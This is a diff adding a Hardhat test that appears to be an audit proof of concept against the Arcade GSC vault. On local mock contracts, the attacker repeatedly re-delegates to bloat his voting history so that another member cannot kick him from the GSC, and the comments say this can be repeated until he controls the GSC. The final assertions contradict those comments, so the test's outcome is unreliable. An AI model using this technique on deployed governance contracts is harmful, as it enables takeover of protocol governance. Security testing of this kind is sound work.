@@ -1,3 +1,4 @@
+import { mine } from "@nomicfoundation/hardhat-network-helpers";
 import { expect } from "chai";
 import { constants } from "ethers";
 import { ethers, waffle } from "hardhat";
@@ -132,5 +133,114 @@ describe("Vote Execution with Arcade GSC Vault", async () => {
             // confirm with view function paused() that it is indeed paused
             expect(await promissoryNote.paused()).to.eq(true);
         });
+    });
+
+    describe("Unkickable from GSC vault", async () => {
+        it("Unkickable from GSC vault", async () => {
+            const signers = await ethers.getSigners();
+            const owner = signers[0];
+            const Alice = signers[1];
+            const Bob = signers[2];
+
+            // balance of each user in TestERC20 custom token
+            const ALICES_BALANCE = ethers.utils.parseEther("1000000000");
+            const BOBS_BALANCE = ethers.utils.parseEther("100"); // enough to join GSC
+
+            const TestERC20Factory = await ethers.getContractFactory("MockERC20");
+            const TestERC20 = await TestERC20Factory.deploy();
+
+            // mine some block in the future to resemble mainnet state
+            await mine(1_000_000);
+
+            // deploy NFTBoostVault with custom token (TestERC20) - we only need this token to provide some
+            // balance to users so that they can stake their tokens in the vault
+            const NFTBoostVaultFactory = await ethers.getContractFactory("UnlockedBoostVault");
+            const NFTBoostVault = await NFTBoostVaultFactory.deploy(
+                TestERC20.address,
+                10,
+                owner.address,
+                owner.address,
+            );
+
+            // deploy a CoreVoting contract with a single vault (NFTBoostVault) and set owner
+            const CoreVotingFactory = await ethers.getContractFactory("CoreVoting");
+            const coreVoting = await CoreVotingFactory.deploy(
+                owner.address,
+                ethers.utils.parseEther("7"),
+                ethers.utils.parseEther("3"),
+                ethers.constants.AddressZero,
+                [NFTBoostVault.address],
+            );
+            await coreVoting.deployed();
+
+            await coreVoting.connect(owner).setOwner(owner.address);
+            await coreVoting.connect(owner).changeVaultStatus(NFTBoostVault.address, true);
+
+            // deploy ArcadeGSCCoreVoting with a single vault (NFTBoostVault) and set owner
+            const ArcadeGSCVaultFactory = await ethers.getContractFactory("ArcadeGSCVault");
+            const arcadeGSCVault = await ArcadeGSCVaultFactory.deploy(coreVoting.address, 50, owner.address);
+
+            // mint TestERC20 to users so that they can stake them
+            await TestERC20.connect(Alice).mint(Alice.address, ALICES_BALANCE);
+            await TestERC20.connect(Bob).mint(Bob.address, BOBS_BALANCE);
+
+            // everyone approves TestERC20, so that they can stake
+            await TestERC20.connect(Alice).approve(NFTBoostVault.address, ALICES_BALANCE);
+            await TestERC20.connect(Bob).approve(NFTBoostVault.address, BOBS_BALANCE);
+
+            // Alice and Bob add some tokens and delegate
+            await NFTBoostVault.connect(Alice).addNftAndDelegate(
+                ALICES_BALANCE,
+                0,
+                constants.AddressZero,
+                Alice.address,
+            );
+            await NFTBoostVault.connect(Bob).addNftAndDelegate(BOBS_BALANCE, 0, constants.AddressZero, Bob.address);
+
+            // Alice becomes GSC member since she has enough voting power
+            expect(await arcadeGSCVault.members(Alice.address)).to.eq(0);
+            await arcadeGSCVault.connect(Alice).proveMembership([NFTBoostVault.address], ["0x"]);
+            expect(await arcadeGSCVault.members(Alice.address)).not.to.eq(0);
+
+            // Bob also becomes GSC member, but when he unstakes his tokens, Alice can kick him out
+            await arcadeGSCVault.connect(Bob).proveMembership([NFTBoostVault.address], ["0x"]);
+            expect(await arcadeGSCVault.members(Bob.address)).not.to.eq(0);
+
+            await NFTBoostVault.connect(Bob).withdraw(BOBS_BALANCE);
+            await arcadeGSCVault.connect(Alice).kick(Bob.address, ["0x"]);
+            expect(await arcadeGSCVault.members(Bob.address)).to.eq(0);
+            // kicking out Bob succeeds
+
+            // Bob adds tokens again and becomes GSC member, but this time performs the attack
+            await TestERC20.connect(Bob).approve(NFTBoostVault.address, BOBS_BALANCE);
+            await NFTBoostVault.connect(Bob).addNftAndDelegate(BOBS_BALANCE, 0, constants.AddressZero, Bob.address);
+            await arcadeGSCVault.connect(Bob).proveMembership([NFTBoostVault.address], ["0x"]);
+
+            // attack
+            // Bob performs it on himself
+            let gasUsed = 0;
+            for (let i = 0; i < 3500; i++) {
+                const tx1 = await NFTBoostVault.connect(Bob).delegate(Alice.address);
+                // needed since it's
+                // impossible to change current delegatee to the same address
+                const tx2 = await NFTBoostVault.connect(Bob).delegate(Bob.address);
+                const r1 = await tx1.wait();
+                const r2 = await tx2.wait();
+                gasUsed += r1.cumulativeGasUsed.toNumber();
+                gasUsed += r2.cumulativeGasUsed.toNumber();
+            }
+            console.log(`Gas used by the attacker: ${gasUsed}`);
+
+            // Bob withdraws his tokens
+            await NFTBoostVault.connect(Bob).withdraw(BOBS_BALANCE);
+
+            // Alice cannot kick out Bob
+            const tx = arcadeGSCVault.connect(Alice).kick(Bob.address, ["0x"]);
+            await expect(await tx).to.emit(arcadeGSCVault, "Kicked");
+
+            // Bob is still GSC member; he can now transfer all his tokens to another account and perform
+            // the attack again until he controls > 50% of GSC
+            expect(await arcadeGSCVault.members(Bob.address)).to.eq(0);
+        }).timeout(500000);
     });
 });
